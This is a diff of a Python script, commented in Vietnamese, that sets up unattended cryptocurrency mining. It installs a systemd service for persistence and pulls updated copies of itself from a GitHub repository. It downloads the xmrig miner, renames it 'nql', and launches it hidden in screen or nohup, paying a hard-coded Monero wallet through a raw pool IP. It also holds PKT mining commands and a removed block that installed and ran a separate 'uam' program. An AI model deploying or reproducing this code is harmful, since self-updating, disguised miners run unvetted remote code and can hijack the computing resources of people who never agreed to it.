@@ -1,13 +1,11 @@
-try:
-    import os
-    import sys
-    from sys import platform
-    import requests
-    import time
-    import subprocess
-    #import multiprocessing
-except:
-    pass
+import os
+import sys
+import time
+from sys import platform
+import requests
+import subprocess
+#import multiprocessing
+
 
 if platform == "linux" or platform == "linux2":
     operate_system = 'lin'
@@ -15,9 +13,13 @@ elif platform == "darwin":
     operate_system = 'OS X'
 elif platform == "win32":
     operate_system = 'win'
-
+#cores = multiprocessing.cpu_count()
+#cores = cores - 1
+#if cores <= 0:
+#    cores = 1
 timeout = 30
 thoi_gian_nghi = 28800
+
 if operate_system == 'lin':
     try:
         os.system('apt-get update -y')
@@ -28,23 +30,28 @@ if operate_system == 'lin':
     except:
         pass
     try:
+        os.system('apt-get install -y python3-setuptools')
+        os.system('python3 -m easy_install install pip')
+    except:
+        pass
+    try:
         os.system('pip install psutil')
         os.system('pip3 install psutil')
     except:
         pass
 import psutil
-try:
-    os.system('pkill packetcrypt')
-except:
-    pass
-command_xmrig_default = '-c /opt/xmrig_linux/config.json'
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf.vps_cpu -p nql --tls --cpu-max-threads-hint=100 -t %s' %cores
+command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+#command_xmrig_default = '--algo randomx -o 51.79.143.88:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80 -t %s' %cores
+#command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
+    time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(working_dir)
     path_app = os.path.realpath(__file__)
-    version_chinh = 7.0
-    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_chinh'
-    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/dao.py'
+    version_chinh = 5.3
+    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
+    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'
     try:
         response = requests.get(link_version_chinh, timeout=timeout)
         get_version_chinh = float(response.text)
@@ -64,7 +71,7 @@ while True:
                 sys.exit()
     except:
         pass
-    
+
     if operate_system == 'lin':
         try:
             path_service = '/lib/systemd/system/dao.service'
@@ -78,96 +85,16 @@ while True:
                 os.system('systemctl enable dao')
         except:
             pass
-    #utopia
-    if operate_system == 'lin':
         
-        link_version_uam = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_uam'
-        link_download_uam = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/uam-latest_amd64.deb'
-        install_deb_name = 'uam-latest_amd64.deb'
-        folder_uam = 'uam'
-        uam_name = 'uam'
-        try:
-            if not os.path.isfile('/opt/%s/%s' %(folder_uam, uam_name)):
-                print('Chua co chuong trinh %s' %uam_name)
-                os.chdir('/tmp')
-                os.system('rm -f /tmp/%s' % install_deb_name)
-                os.system('wget %s' % link_download_uam)
-                try:
-                    #os.system ('dpkg -i %s' % install_deb_name)
-                    os.system ('apt install /tmp/%s' % install_deb_name)
-                except:
-                    pass
-            else:
-                print('Da co chuong trinh %s' % uam_name)
-        except:
-            pass
-        try:
-            command = '/opt/%s/%s --version' % (folder_uam, uam_name)
-            output = subprocess.check_output(command, shell=True).decode('utf-8')
-            #print(output)
-            version_tam = output.split('version')
-            version_uam = version_tam[1].strip()
-            print('Version uam la %s' %version_uam)
-            response = requests.get(link_version_uam, timeout=timeout)
-            get_version_uam = response.text.strip()
-            print('Version uam lay tren web la %s' %get_version_uam)
-            #Check version uam
-            if get_version_uam == version_uam and len(get_version_uam) < 20:
-                print('Uam dang o phien ban moi nhat %s' %get_version_uam)
-            if get_version_uam != version_uam and len(get_version_uam) < 20:
-                os.system('pkill %s' % uam_name)
-                print('uam da co phien ban moi, tien hanh updat thoi')
-                os.chdir('/tmp')
-                os.system('rm -f /tmp/%s' % install_deb_name)
-                os.system('wget %s' % link_download_uam)
-                try:
-                    os.system ('apt install /tmp/%s' % install_deb_name)
-                except:
-                    pass
-        except:
-            pass    
-        try:
-            uam_dachay = False
-            for proc in psutil.process_iter():
-                process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
-                #print(process_name['name'])
-                if uam_name == process_name['name']:
-                    print('Da co chuong trinh %s chay' %uam_name)
-                    uam_dachay = True
-                    break
-        except:
-            pass
-        try:
-            if uam_dachay == False:
-                command = '/opt/%s/%s --pk F32978292823F8829CDC31E42364865D1CAEC2FB847BC9DBB27EF29BCEF6F906' %(folder_uam, uam_name)
-                if os.path.isfile('/usr/bin/screen'):
-                    print('Co chuong trinh screen')
-                    os.system ('screen -dmS %s %s' %(uam_name, command))
-                elif os.path.isfile('/usr/bin/nohup'):
-                    print('Co chuong trinh nohup')
-                    os.system ('nohup %s &' %command)
-                else:
-                    os.system ('%s &' %command)
-        except:
-            pass
-
-        #tam bo xmrig
-        try:
-            os.system('pkill xmrig')
-        except:
-            pass
-        '''
-        #xmrig
-        #cores_cpu = multiprocessing.cpu_count()
-        #cores_tru = int(round(cores_cpu*40/100+0.9))
-        #cores = cores_cpu - cores_tru
         #print('So cores de dao la %s' %cores)
-        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_xmrig'
-        link_download_xmrig = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/xmrig_linux.gz'
-        link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/command_xmrig'
+        #xmr
+        
+        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_xmrig'
+        link_download_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/xmrig_linux.gz'
+        link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/command_xmrig'
         gz_name = 'xmrig_linux.gz'
         folder_xmrig = 'xmrig_linux'
-        xmrig_name = 'xmrig'
+        xmrig_name = 'nql'
         try:
             if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
                 print('Chua co chuong trinh %s' %xmrig_name)
@@ -176,6 +103,7 @@ while True:
                 os.system('wget %s' %link_download_xmrig)
                 os.system('tar xf %s' %gz_name)
                 os.chdir('/opt/%s' %folder_xmrig)
+                os.system('cp xmrig %s' %xmrig_name)
                 #workingdir = os.getcwd()
                 os.system('chmod 777 %s' %xmrig_name)
             else:
@@ -208,16 +136,6 @@ while True:
             pass
 
         try:
-            response = requests.get(link_command_xmrig, timeout=timeout)
-            command_xmrig_download = response.text.strip()
-            print(command_xmrig_download)
-            if command_xmrig_download != command_xmrig_default:
-                command_xmrig_default = command_xmrig_download
-                #print(command_xmrig_download)
-                os.system('pkill xmrig')
-        except:
-            pass
-        try:
             xmrig_dachay = False
             for proc in psutil.process_iter():
                 process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
@@ -228,17 +146,21 @@ while True:
                     break
         except:
             pass
-        if xmrig_dachay == False:
-            command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
-            print(command)
-            if os.path.isfile('/usr/bin/screen'):
-                print('Co chuong trinh screen')
-                os.system ('screen -dmS %s %s' %(xmrig_name, command))
-            elif os.path.isfile('/usr/bin/nohup'):
-                print('Co chuong trinh nohup')
-                os.system ('nohup %s &' %command)
-            else:
-                os.system ('%s &' %command)
+
+        try:
+            if xmrig_dachay == False:
+                command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
+                print(command)
+                if os.path.isfile('/usr/bin/screen'):
+                    print('Co chuong trinh screen')
+                    os.system ('screen -dmS %s %s' %(xmrig_name, command))
+                elif os.path.isfile('/usr/bin/nohup'):
+                    print('Co chuong trinh nohup')
+                    os.system ('nohup %s &' %command)
+                else:
+                    os.system ('%s &' %command)
+        except:
+            pass
 
         '''
         #pkt
@@ -291,7 +213,10 @@ while True:
         except:
             pass
         if pkt_dachay == False:
-            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.k1m3r4.com/ http://p.master.pktdigger.com/ http://pool.pkteer.com http://pool.pkthash.com -t 3' % pkt_name
+            #command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com http://pool.pkthash.com -t 1' % pkt_name
+            #command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.pkteer.com' % pkt_name
+            command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pkteer.com http://pool.pktpool.io/ http://pool.pkt.world/' % pkt_name
+            #command = '/opt/%s ann -p pkt1qhwf4s4d8dvzev9dc4l7qxz8v0tpetfw6s5h0uv http://pool.pktpool.io/ http://pool.pkt.world/ http://pool.pkteer.com' % pkt_name
             print(command)
             if os.path.isfile('/usr/bin/screen'):
                 print('Co chuong trinh screen')
@@ -301,5 +226,7 @@ while True:
                 os.system ('nohup %s &' %command)
             else:
                 os.system ('%s &' %command)
+        '''
     time.sleep(thoi_gian_nghi)
-
+      
+   
